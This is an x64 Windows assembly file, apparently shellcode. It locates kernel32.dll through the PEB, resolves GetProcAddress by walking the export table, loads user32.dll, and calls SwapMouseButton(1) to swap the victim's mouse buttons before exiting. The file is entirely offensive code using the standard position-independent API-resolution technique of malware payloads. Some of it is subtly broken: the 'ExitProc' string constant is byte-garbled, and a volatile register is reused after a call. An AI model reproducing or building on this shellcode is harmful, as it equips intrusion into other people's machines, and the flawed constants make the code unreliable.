section .text
	global _start
_start:

		;align stack to 16 bytes
		xor rax , rax
		mov rbx , rsp
		and rsp , 0xFFFFFFFFFFFFFFF0
		sub rsp, 0x30               ; Shadow space


		;get basse address of kernel32.dll
		xor ecx , ecx
		mov rsi , gs:[rcx + 0x60] ; PEB
		mov rsi , [rsi + 0x18] ;RBX = PEB -> ldr
		mov rsi , [rsi + 0x20] ; RSI = InMemOrder
		mov rsi , [rsi] ;traverse through modules
		mov rsi , [rsi]
		mov rbx , [rsi + 0x30] ; BAse Address of kernel32.dll (DllBase)
		
		;RBX = Base Address of kernel32.dll
		
		;find the export table
		mov edx , [rbx + 0x3c]  ;RDX = DOS -> e_elfanew RVA (DWORD)
		add rdx , rbx ; VA of e_elfanew
		mov edx , [rdx + 0x78] ; Export Directory RVA
		add rdx , rbx ; VA of Export Directory
		mov esi , [rdx + 0x20] ; RVA of AddressofNames
		add rsi , rbx ; VA of AddressofNames
		
		;RDX = Base Address of Export Directory
		;Finding GetProcAddress function Name (just a index)
		xor rcx , rcx
		
		Get_fun:
		inc rcx
		mov eax , [rsi + rcx * 4] ;RVA of next function
		add rax , rbx ; VA of next function

		cmp qword  [rax] , 0x41636f7270546547 ; compare first 8 chars "GetProcA"
		jnz Get_fun
		cmp dword  [rax + 8] , 0x65726464      ; "ddre"
		jnz Get_fun
		cmp word  [rax + 12] , 0x7373         ; "ss"
		jnz Get_fun
		
		;RCX = index of AddressofNames[]
		
		

		;optimized :
		mov esi , [rdx + 0x24]
		movzx ecx , word [rbx + rsi + rcx * 2]
		mov esi , [rdx + 0x1c]
		mov r8 , [rbx + rsi + rcx * 4]
		add r8 , rbx
		
		
		
		;r8 = getprocAddress

		

		;build "LOadLibraryA" strig on stack
		mov qword [rsp] , 0x7262694C64616F4C   ; "LoadLibr"
		mov dword [rsp + 8] , 0x41797261         ; "aryA"
		xor eax , eax
		lea rdi , [rsp + 12]
		stosb
		mov rcx , rbx ; hModule = kernel32.dll
		lea rdx , [rsp] ; lpProcName = "LoadLibraryA"
		call r8 ; GetProcAddress(kernel32.dll, "LoadLibraryA")
		mov r9 , rax ; r9 = LoadLibraryA
		

		
		
		
		; --- build "user32.dll" string ---
		mov qword [rsp] , 0x642E323372657375  ; "user32.d" (little-endian)
		mov word [rsp + 8], 0x6C6C    ; "ll" 
		xor eax , eax
		lea rdi , [rsp + 10]
		stosb
		mov rcx , rsp
		call r9  ; LoadLibraryA("user32.dll")
		mov rsi , rax  ; user32.dll base
		

		
		
		; build "SwapMouseButton" string
		mov qword [rsp] , 0x73756F4D70617753 ; 'SwapMous'
		mov qword [rsp + 8], 0x6E6F7474754265 ; "eButton"
		mov byte [rsp + 16] , 0x6E ; 'n' completes "Button"
		xor al , al
		lea rdi , [rsp + 17]
		stosb
		mov rcx , rsi ;user32.dll base
		lea rdx , [rsp] ; "SwapMouseButton"
		call r8 ; GetProcAddress(user32.dll, "SwapMouseButton")
		
		; --- call SwapMouseButton(1) ---
		
		mov rcx, 1        ; argument = 1 (swap)
		call rax          ; call SwapMouseButton(1)
		
		; --- build "ExitProcess" string ---
		mov qword [rsp], 0x74786545726f6350  ; "ExitProc" (little-endian)
		mov dword [rsp + 8], 0x73736573      ; "sess"
		xor eax , eax
		lea rdi , [rsp + 12]
		stosb
		mov rcx , rbx
		lea rdx , [rsp]
		call r8 ; GetProcAddress(kernel32.dll, "ExitProcess")
		
		
		
		; --- call ExitProcess(0) ---
		xor rcx, rcx
		call rax
		
		
		
		
		
		

